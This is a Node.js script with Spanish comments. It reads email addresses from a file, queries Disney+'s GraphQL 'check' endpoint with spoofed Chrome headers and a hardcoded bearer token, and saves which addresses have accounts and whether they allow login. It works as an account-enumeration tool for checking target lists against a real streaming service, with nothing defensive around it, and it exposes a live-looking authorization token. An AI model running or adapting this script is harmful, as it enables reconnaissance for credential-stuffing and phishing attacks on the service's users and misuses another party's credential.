import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..DVhIqdSPvrw-OKTK.IK8uVRfaYtXDtwYWnzyfpuAyQhzWOvdc4JyCseIP9H_N17cXLZr7YmMLvVanMe6mYFcgNmA79-0FpmkXmu8PPci23VpJXz6d0D3EzudePjpa9ZWVvMrByEm5txeTSjHZZyMfXdSxGnD9a0M5nA2d_JRvmbxrlpodedofkZ10sZG8GT1utQGB-yhPHICAN-IUbDO2uqE1swO9JlLz4-wCsno9A_cdvmtYFvEphjyuztmh9LVncQSjOI-MUzJjKThHkmuU8Sb0vsqPhJi72wPWwptNeLdDY1PhVsOVGgJimm9PYTONaIuHh-in734mtYHRlJqrXIwNS1xgLzAuL2byxWHgwhUtNYDoeoCWBogBLglZOA0vu-aeuoD3pqkQwq7ODtVL5C-YgX_W-MuErWr_ZDxl2XSAnI1uVKGI4_2ZL9I4NZIu5QC57flgTTJWv8bsZ0qnIQDCCrQZ4hHt7DKaomHk85FQSwnHsr7cONXYPyonfy150vUQYTiJcUX76C7ZGcF2FtBx6UXTNkCnc8J8QbQWIY-c2q9MzjB42Puy32Ak29cUYJDws9n4PHmeWkmq_3LwmnBNl3kSsI7OU47rYOdxzFz7cklkEU2mK64w-jlRzjHxNPav_A8v6n512jkdmMv_34f60AY3bb0N6-JetdPKrgPblFWEADJapqtuJqzArio4OjRjaVd1hJz1NmBP1V0eoSd0QGnwN2GJ_Jiu4DErXsBnwjlXMmeAd3tq2_vQr4s7oM1FtUe987cvBvxlz-tDutHjEtsW8_9d8A_DV3m558FuN5F7SLnemTb0YzQ_7I1_7ku6--ad1QsXOg95AyJDXb661HxuehBXXOFwPrcnk9vXSArRVrUhztF49MhtKNftzcB9UL6nPnZanKYOBDSYDNqwhN7fGxWiNwJbkxjcEQD74imsglbNmENPuynUph-tsLtGxArK4uBrroHOIzyE06aj_snrUh18ZRiZI_TIgbgBFaPQS5CELRiri-Bt6LLj_-zaatCTwimGICqRbvpnK84eA0iiD3n5S29Yz82heAcbWQZIUS2NxbHahPFdX-5K-eBmWAEJXRofqnCwmISZezJVk58oK8D2Qb14-zruVyDgecsWq3wMqsoX5YRO9A-MmR1zHq6MiYIfqVy_AkvuQLVld8HjQb2YUQNHkLVH9lfLuqG1b2mWdbZhoBd5IuONrC8BRwYp-z074JCD_Tl6eYz92ZJXftMkJHSYzv9eGKbrewgA6mTtWp2-wtvbnRUDagqaTJm4qhU5wxJKZLEo_OQE3bKhD2oQJ73mUw8G5T71td_iffwGvrTzZ-ORkrKjxA-ymdeCixKDf44NswglAYkaRFoQlljEyrRU49hFLNiRPvMblLbarIEfBoeKMdQmGPBDxZGMxqPAFVgs7YnSbY-UBv9al-gx5lxKoGyWKbHXyuEmIkgByieHSBKqtUd1FeUMCc8OE0HEoh1h6EASH9nNg0uc9AtMUKAJk9LITSp10yg9VGU4dLcySLGNxYD9Fr46hhDYChyJhlBMyWvT-6ruYv-HjM05oAJM86pTk2u_13Z8pUgQQl7PkeOCxFXMFFuDcC7h1I1CZFl4DlNy5c_2D9vFdLeKu5Oz0qZT7J6Xz5aH3zkAVC_BAxGeGgdZVgTygHq0HM_1Nt_zfY-PWkcih2aWqLZ90nf-s4bDyyaHB5gRz2wAjjMDuRDEXCCeURH3eAMzXg0m-66gVP4k_a1AYH_WufanLPIf7X_l0IibjEoKtu3YCP0z8pEtwkHA9CyPML8h5raJe-r3eEPutZw5CT3wjiMXs3Cw2bAphJdVLBpqxGOfsIh7xguZQ9ox2igNO6v596jIS9DeIP2a0JJ1UTHS2lK0srvL2llkxuHmuJRzvqL5DxMpa3_82NvpcVjyKhwRqliEbyfoU9m1hVERZk6H9wmxjC5bu8UnDY4YcQlHtTWeXkAmfNNgaOBmRZ1ZOeoNim759Jv6F6sQaRIRinj0n495Ho7g4lCEgIGk5FeTvyxL7nu2BjuJn0sXjVlfJYt9K6MOrZheSeyHYQ1OwjcQbeQGYVzky1YHM4ndkf9jhW4fLHETR0cFdYYMI9rJ0w3OWKJ0Vv7-zRw-K4fQqaGVGoU4lIiNxPZf3u5dgsXUlARgjFn-ofwNF2zCWYyLLVi3U0fOWPiw1px534rHe02uCylof2Qr7siZmhUb84FvPxr0sAJF_Ty6XJFJBOUMSejCZKlN2EmkXaDqyhnjyHVHW90pEWySVWeRcQntzsbVd521QpXhdpke-gqG2vqav3f9haU5rVrAGSi5aLYhbViq8y_FI3U0IG42f1_FXvl7SZ4HdfzvRD3hHp1acz34wB_vgsg9XWsNTS6dmgiBVC4GRgS58lDuqx6eeil2Lztb_khExp50S5J0GPqeIvwA9mOIOACsoQylLie4qt-P1jSZSgUj5zZRFPYS6pGSdBwj6wv1NTsxw8iJALfVD8bmk9x9oVDIpyAD4ohl1w9vEQCvpEzI7BityhGaJ-a05aK3QA1S6Sm_qJ3bh6TFDJMCWq13iA-2zjnfijsnm7lUjN78IdqyU9OVjlhFCjh34bzUkZNHdo7rjRV8VO3hf8an5DCFIg.fh3auoj7bvDKV8HSgNu2HA"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];

    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")){
                            result.login=true
                            console.log("LOGIN")
                        }else{
                            result.login=false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}